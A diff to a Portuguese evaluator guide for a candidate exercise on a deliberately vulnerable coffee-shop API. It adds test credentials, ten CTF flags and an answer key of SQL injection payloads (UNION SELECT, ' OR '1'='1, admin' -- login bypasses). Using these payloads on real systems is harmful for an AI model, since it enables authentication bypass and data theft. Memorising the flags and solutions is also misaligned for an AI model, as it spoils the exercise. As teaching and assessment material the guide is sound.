@@ -31,9 +31,39 @@
 | Parte | Duração Sugerida |
 |-------|------------------|
 | Parte 1: Exploração | 30-45 minutos |
-| Parte 2: CTF | 45-60 minutos |
+| Parte 2: CTF | 60-90 minutos |
 | Parte 3: Bugs | 45-60 minutos |
-| **Total** | **2-3 horas** |
+| **Total** | **2.5-3.5 horas** |
+
+---
+
+## 📊 Dados do Banco
+
+O banco foi populado com dados realistas:
+
+| Tabela | Quantidade | Descrição |
+|--------|------------|-----------|
+| categories | 10 | Categorias de produtos |
+| products | 108 | Produtos variados |
+| users | 27 | Usuários diversos (admins, gerentes, baristas, clientes) |
+| orders | 25 | Pedidos com histórico |
+| order_items | ~40 | Itens dos pedidos |
+| promotions | 9 | Códigos promocionais |
+| audit_logs | 9 | Logs de auditoria |
+| secret_flags | 10 | Flags do CTF |
+| admin_notes | 5 | Notas confidenciais |
+
+### Usuários de Teste
+
+| Username | Senha | Cargo | Observação |
+|----------|-------|-------|------------|
+| admin | admin123 | admin | Conta principal |
+| cto_rafael | r4f43l_s3cr3t | admin | Tem flag nas notes |
+| gerente_maria | maria2024! | manager | |
+| barista_joao | cafezinho | barista | |
+| cliente_carlos | carlos99 | user | Cliente VIP |
+| suporte_tech | Flag{SQL_1nj3ct10n_M4st3r} | admin | INATIVO - Flag na senha! |
+| root | Flag{H0n3yp0t_D3t3ct3d} | admin | INATIVO - Honeypot |
 
 ---
 
@@ -90,7 +120,7 @@ docker-compose up --build
 
 ## 📊 Critérios de Avaliação
 
-### Parte 1: Exploração (0-25 pontos)
+### Parte 1: Exploração (0-30 pontos)
 
 | Critério | Pontos |
 |----------|--------|
@@ -98,16 +128,23 @@ docker-compose up --build
 | Conseguiu fazer requisições POST | 5 |
 | Usou query params corretamente | 5 |
 | Interpretou respostas de erro | 5 |
+| Conseguiu criar um pedido | 5 |
 | Documentou os testes realizados | 5 |
 
-### Parte 2: CTF (0-185 pontos)
+### Parte 2: CTF (0-520 pontos)
 
-| Flag | Pontos | Técnica Necessária |
-|------|--------|-------------------|
-| Flag 1 | 10 | UNION SELECT básico |
-| Flag 2 | 25 | SQL Injection em filtro |
-| Flag 3 | 50 | UNION SELECT avançado |
-| Flag 4 | 100 | Bypass de autenticação |
+| Flag | Pontos | Dificuldade | Técnica |
+|------|--------|-------------|---------|
+| Flag{W3lc0m3_t0_SQL_W0rld} | 10 | 🟢 Iniciante | UNION SELECT básico |
+| Flag{SQL_1nj3ct10n_M4st3r} | 25 | 🟢 Fácil | Ver usuários inativos |
+| Flag{Pr0m0_C0d3_Hunt3r} | 30 | 🟢 Fácil | SQLi em promoções |
+| Flag{Pr0duct_Hunt3r_Pr0} | 40 | 🟡 Fácil | Buscar produto especial |
+| Flag{Un10n_S3l3ct_Pr0} | 50 | 🟡 Médio | UNION SELECT avançado |
+| Flag{H0n3yp0t_D3t3ct3d} | 50 | 🟡 Médio | Login como root |
+| Flag{1nf0rm4t10n_Sch3m4} | 60 | 🟡 Médio | Explorar information_schema |
+| Flag{4dm1n_4cc3ss_Gr4nt3d} | 75 | 🟠 Médio | Notas do CTO |
+| Flag{4dm1n_N0t3s_F0und} | 80 | 🟠 Médio-Difícil | Tabela admin_notes |
+| Flag{4dm1n_P4ssw0rd_L34k3d} | 100 | 🔴 Difícil | Bypass autenticação |
 
 ### Parte 3: Bugs (0-60 pontos)
 
@@ -120,15 +157,13 @@ docker-compose up --build
 | #5 Validação | 10 | Input validation |
 | #6 Escopo | 10 | var vs let/const |
 
-### Pontuação Total: 270 pontos
+### Pontuação Total: 610 pontos
 
 ---
 
-## ✅ Gabarito Completo
+## ✅ Gabarito Completo - CTF
 
-### CTF - Soluções Detalhadas
-
-#### Flag 1 (10 pts) - `Flag{W3lc0m3_t0_SQL_W0rld}`
+### Flag 1 (10 pts) - `Flag{W3lc0m3_t0_SQL_W0rld}`
 
 **Endpoint:** GET `/api/vulnerable/search`
 
@@ -138,14 +173,14 @@ docker-compose up --build
 ```
 
 **Explicação:**
-1. A aspas simples `'` fecha o LIKE
-2. UNION combina resultados de outra tabela
-3. Precisa ter o mesmo número de colunas (9)
+1. A query original tem 9 colunas
+2. Fechamos a string com `'`
+3. Usamos UNION para combinar com secret_flags
 4. `--` comenta o resto da query
 
 ---
 
-#### Flag 2 (25 pts) - `Flag{SQL_1nj3ct10n_M4st3r}`
+### Flag 2 (25 pts) - `Flag{SQL_1nj3ct10n_M4st3r}`
 
 **Endpoint:** GET `/api/vulnerable/users`
 
@@ -154,32 +189,157 @@ docker-compose up --build
 ?role=' OR '1'='1
 ```
 
+**Ou para ver apenas inativos:**
+```
+?role=' OR active=0 --
+```
+
 **Explicação:**
-1. O OR '1'='1' sempre é verdadeiro
-2. Retorna TODOS os usuários incluindo inativos
-3. O usuário `suporte_tech` tem a flag na senha
-4. A flag aparece na resposta JSON
+1. Retorna TODOS os usuários
+2. O usuário `suporte_tech` tem a flag como senha
+3. Está marcado como `active=FALSE`
 
 ---
 
-#### Flag 3 (50 pts) - `Flag{Un10n_S3l3ct_Pr0}`
+### Flag 3 (30 pts) - `Flag{Pr0m0_C0d3_Hunt3r}`
+
+**Endpoint:** GET `/api/vulnerable/promo`
+
+**Payload:**
+```
+?code=' OR '1'='1
+```
+
+**Explicação:**
+1. Retorna todas as promoções
+2. Existe um código `FLAG99` com a flag no nome
+3. Está marcado como `active=FALSE`
+
+---
+
+### Flag 4 (40 pts) - `Flag{Pr0duct_Hunt3r_Pr0}`
+
+**Endpoint:** GET `/api/vulnerable/search` ou `/api/products`
+
+**Payload:**
+```
+?q=Flag
+```
+
+**Ou:**
+```
+?q=999
+```
+
+**Explicação:**
+1. Há um produto chamado "Flag Coffee Special"
+2. Preço de R$ 999,99 (suspeito!)
+3. Está na categoria "Temporários"
+4. A flag está na descrição do produto
+
+---
+
+### Flag 5 (50 pts) - `Flag{Un10n_S3l3ct_Pr0}`
 
 **Endpoint:** GET `/api/vulnerable/product/:id`
 
 **Payload:**
 ```
-/api/vulnerable/product/0 UNION SELECT 1,flag_code,flag_name,hint,points,6,7,8,9,10,11,12 FROM secret_flags WHERE flag_name='Avançado'
+/api/vulnerable/product/0 UNION SELECT 1,flag_code,flag_name,hint,points,6,7,8,9,10,11,12,13,14,15 FROM secret_flags WHERE flag_name='UNION Expert'
 ```
 
 **Explicação:**
-1. ID 0 não existe, retorna vazio
-2. UNION adiciona os resultados da secret_flags
-3. Precisa de 12 colunas (conta do SELECT original)
-4. As flags aparecem nos campos name, description, etc.
+1. A query tem 15 colunas
+2. ID 0 não existe, então só retorna o UNION
+3. Precisa mapear as colunas corretamente
 
 ---
 
-#### Flag 4 (100 pts) - `Flag{4dm1n_P4ssw0rd_L34k3d}`
+### Flag 6 (50 pts) - `Flag{H0n3yp0t_D3t3ct3d}`
+
+**Endpoint:** POST `/api/vulnerable/login`
+
+**Payload:**
+```json
+{
+    "username": "root' --",
+    "password": ""
+}
+```
+
+**Ou:**
+```json
+{
+    "username": "root",
+    "password": "Flag{H0n3yp0t_D3t3ct3d}"
+}
+```
+
+**Explicação:**
+1. A conta `root` é um honeypot (armadilha)
+2. A senha É a própria flag
+3. O sistema detecta e avisa que é um honeypot
+
+---
+
+### Flag 7 (60 pts) - `Flag{1nf0rm4t10n_Sch3m4}`
+
+**Endpoint:** GET `/api/vulnerable/tables`
+
+**Payload:**
+```
+?schema=grao_codigo
+```
+
+**Explicação:**
+1. Retorna todas as tabelas do banco
+2. A flag é concedida por descobrir `secret_flags` e `admin_notes`
+3. Usar information_schema é técnica fundamental
+
+---
+
+### Flag 8 (75 pts) - `Flag{4dm1n_4cc3ss_Gr4nt3d}`
+
+**Endpoint:** GET `/api/vulnerable/users`
+
+**Payload:**
+```
+?role=' OR username='cto_rafael
+```
+
+**Ou ver todos com:**
+```
+?role=' OR '1'='1
+```
+
+**Explicação:**
+1. O CTO `cto_rafael` tem a flag no campo `notes`
+2. Precisa ver todos os usuários para encontrar
+
+---
+
+### Flag 9 (80 pts) - `Flag{4dm1n_N0t3s_F0und}`
+
+**Endpoint:** GET `/api/vulnerable/notes`
+
+**Payload:**
+```
+?priority=' OR '1'='1
+```
+
+**Ou específico:**
+```
+?priority=critical
+```
+
+**Explicação:**
+1. A tabela `admin_notes` é "escondida"
+2. Há uma nota com título "Senhas do Sistema"
+3. O conteúdo contém a flag
+
+---
+
+### Flag 10 (100 pts) - `Flag{4dm1n_P4ssw0rd_L34k3d}`
 
 **Endpoint:** POST `/api/vulnerable/login`
 
@@ -187,29 +347,35 @@ docker-compose up --build
 ```json
 {
     "username": "admin' --",
-    "password": "qualquer_coisa"
+    "password": "qualquer"
 }
 ```
 
-**Ou alternativa:**
+**Alternativas:**
 ```json
 {
-    "username": "' OR '1'='1' --",
+    "username": "' OR role='admin' AND active=1 --",
     "password": ""
 }
 ```
 
+```json
+{
+    "username": "admin'/*",
+    "password": "*/--"
+}
+```
+
 **Explicação:**
-1. `admin' --` fecha a aspas do username e comenta o resto
-2. A query fica: `WHERE username = 'admin' --' AND password = '...'`
-3. A verificação de senha é ignorada
-4. Como logou como admin, a flag é retornada
+1. O `--` comenta a verificação de senha
+2. Precisa ser admin ATIVO (não pode ser suporte_tech ou root)
+3. A query fica: `WHERE username = 'admin' --' AND password = '...'`
 
 ---
 
-### Bugs - Soluções Detalhadas
+## ✅ Gabarito Completo - Bugs
 
-#### Bug #1 - Comparação de Tipos
+### Bug #1 - Comparação de Tipos
 
 **Arquivo:** `src/routes/buggy.js` linha ~35
 
@@ -227,13 +393,12 @@ const inStock = product.stock !== 0;
 
 **Explicação:**
 - `stock` é número, `'0'` é string
-- `10 == '0'` é `false` (correto por acaso)
-- `0 == '0'` é `true` (coerção), mas o ternário inverteria
-- Melhor usar comparação numérica direta
+- A comparação `==` faz coerção de tipos
+- Melhor usar comparação numérica explícita
 
 ---
 
-#### Bug #2 - Cálculo Incorreto
+### Bug #2 - Cálculo Incorreto
 
 **Arquivo:** `src/routes/buggy.js` linha ~65
 
@@ -251,12 +416,11 @@ total += subtotal; // Soma correta
 
 **Explicação:**
 - `'0' + 15.00 = '015'` (concatenação)
-- `'015' + 12.00 = '01512'`
-- Resultado final: string `'0151210...'`
+- Variáveis numéricas devem ser inicializadas com números
 
 ---
 
-#### Bug #3 - Async/Await
+### Bug #3 - Async/Await
 
 **Arquivo:** `src/routes/buggy.js` linha ~95
 
@@ -286,13 +450,11 @@ await Promise.all(items.map(async (item) => {
 
 **Explicação:**
 - `forEach` não retorna Promise
-- O código após forEach executa imediatamente
 - `for...of` com await espera cada iteração
-- `Promise.all` executa em paralelo e espera todas
 
 ---
 
-#### Bug #4 - Off-by-One Error
+### Bug #4 - Off-by-One Error
 
 **Arquivo:** `src/routes/buggy.js` linha ~140
 
@@ -301,7 +463,6 @@ await Promise.all(items.map(async (item) => {
 for (let i = 1; i <= products.length; i++) {
     ranking.push({ product: products[i] });
 }
-// products[products.length] é undefined!
 ```
 
 **Solução:**
@@ -316,13 +477,12 @@ for (let i = 0; i < products.length; i++) {
 
 **Explicação:**
 - Arrays são 0-indexed
-- `products.length` é 5, mas índices vão de 0 a 4
-- `products[5]` é `undefined`
-- Se queria pular o primeiro, seria `i = 1; i < length`
+- `products[products.length]` é `undefined`
+- Use `<` ao invés de `<=`
 
 ---
 
-#### Bug #5 - Validação de Entrada
+### Bug #5 - Validação de Entrada
 
 **Arquivo:** `src/routes/buggy.js` linha ~175
 
@@ -334,8 +494,8 @@ const discountedPrice = product.price * (1 - discount_percent / 100);
 
 **Solução:**
 ```javascript
-// Adicionar validação
 if (typeof discount_percent !== 'number' || 
+    isNaN(discount_percent) ||
     discount_percent < 0 || 
     discount_percent > 100) {
     return res.status(400).json({
@@ -348,14 +508,13 @@ const discountedPrice = product.price * (1 - discount_percent / 100);
 ```
 
 **Explicação:**
-- `-50%` resulta em `price * 1.5` (aumento!)
-- `150%` resulta em `price * -0.5` (preço negativo!)
-- `"abc"` resulta em `NaN`
+- Valores negativos aumentam o preço
+- Valores > 100 resultam em preço negativo
 - Sempre validar entrada do usuário
 
 ---
 
-#### Bug #6 - Escopo de Variável
+### Bug #6 - Escopo de Variável
 
 **Arquivo:** `src/routes/buggy.js` linha ~210
 
@@ -364,26 +523,22 @@ const discountedPrice = product.price * (1 - discount_percent / 100);
 var categoryTotal = 0; // Fora do loop, escopo de função
 
 for (const category of categories) {
-    // ...
-    categoryTotal += parseFloat(result.total); // Acumula!
-    summary.push({ total_sales: categoryTotal });
+    categoryTotal += parseFloat(result.total);
+    summary.push({ total_sales: categoryTotal }); // Acumula!
 }
 ```
 
 **Solução:**
 ```javascript
 for (const category of categories) {
-    // ...
-    const categoryTotal = parseFloat(result.total); // Dentro do loop
+    const categoryTotal = parseFloat(result.total); // Dentro do loop!
     summary.push({ total_sales: categoryTotal });
 }
 ```
 
 **Explicação:**
 - `var` tem escopo de função, não de bloco
-- A variável acumula entre iterações
-- `let` ou `const` dentro do loop resolve
-- Cada categoria deve ter seu próprio total
+- Usar `const`/`let` dentro do loop cria nova variável
 
 ---
 
@@ -396,6 +551,7 @@ Se o candidato está travado no CTF:
 1. **Dica nível 1:** "Tente colocar uma aspas simples no campo"
 2. **Dica nível 2:** "O erro SQL te mostra a estrutura da query"
 3. **Dica nível 3:** "Pesquise sobre SQL Injection UNION SELECT"
+4. **Dica nível 4:** "Acesse /api/vulnerable/flags para ver dicas"
 
 ### Para Dificuldade com Bugs
 
@@ -411,31 +567,45 @@ Se o candidato está travado no CTF:
 Candidato: _______________
 Data: _______________
 
-PARTE 1 - EXPLORAÇÃO
+PARTE 1 - EXPLORAÇÃO (30 pts)
 [ ] GET básico (5 pts)
 [ ] POST (5 pts)  
 [ ] Query params (5 pts)
 [ ] Erros (5 pts)
+[ ] Criar pedido (5 pts)
 [ ] Documentação (5 pts)
-Subtotal: ___ / 25
+Subtotal: ___ / 30
 
-PARTE 2 - CTF
-[ ] Flag 1 (10 pts)
-[ ] Flag 2 (25 pts)
-[ ] Flag 3 (50 pts)
-[ ] Flag 4 (100 pts)
-Subtotal: ___ / 185
+PARTE 2 - CTF (520 pts)
+[ ] Flag 1 - Welcome (10 pts)
+[ ] Flag 2 - SQL Master (25 pts)
+[ ] Flag 3 - Promo Hunter (30 pts)
+[ ] Flag 4 - Product Hunter (40 pts)
+[ ] Flag 5 - Union Pro (50 pts)
+[ ] Flag 6 - Honeypot (50 pts)
+[ ] Flag 7 - Schema (60 pts)
+[ ] Flag 8 - CTO Notes (75 pts)
+[ ] Flag 9 - Admin Notes (80 pts)
+[ ] Flag 10 - Admin Access (100 pts)
+Subtotal: ___ / 520
 
-PARTE 3 - BUGS
-[ ] Bug 1 (10 pts)
-[ ] Bug 2 (10 pts)
-[ ] Bug 3 (10 pts)
-[ ] Bug 4 (10 pts)
-[ ] Bug 5 (10 pts)
-[ ] Bug 6 (10 pts)
+PARTE 3 - BUGS (60 pts)
+[ ] Bug 1 - Comparação (10 pts)
+[ ] Bug 2 - Cálculo (10 pts)
+[ ] Bug 3 - Async (10 pts)
+[ ] Bug 4 - Off-by-One (10 pts)
+[ ] Bug 5 - Validação (10 pts)
+[ ] Bug 6 - Escopo (10 pts)
 Subtotal: ___ / 60
 
-TOTAL: ___ / 270
+TOTAL: ___ / 610
+
+Nível de Classificação:
+[ ] Expert (500+)
+[ ] Avançado (350-499)
+[ ] Intermediário (200-349)
+[ ] Iniciante (100-199)
+[ ] Precisa desenvolver (<100)
 
 Observações:
 _______________________
@@ -465,6 +635,36 @@ docker-compose up --build
 ```bash
 lsof -i :3000
 kill -9 <PID>
+```
+
+### Reset completo
+```bash
+docker-compose down -v --remove-orphans
+docker volume prune -f
+docker-compose up --build
+```
+
+---
+
+## 🔍 Queries Úteis para Verificação
+
+```sql
+-- Ver flags encontradas
+SELECT * FROM secret_flags WHERE found_by IS NOT NULL;
+
+-- Ver usuários com flags
+SELECT username, password, notes FROM users 
+WHERE password LIKE '%Flag{%' OR notes LIKE '%Flag{%';
+
+-- Produtos especiais
+SELECT name, price, description FROM products 
+WHERE description LIKE '%Flag{%';
+
+-- Promoções com flag
+SELECT * FROM promotions WHERE name LIKE '%Flag{%';
+
+-- Notas do admin
+SELECT * FROM admin_notes WHERE content LIKE '%Flag{%';
 ```
 
 ---
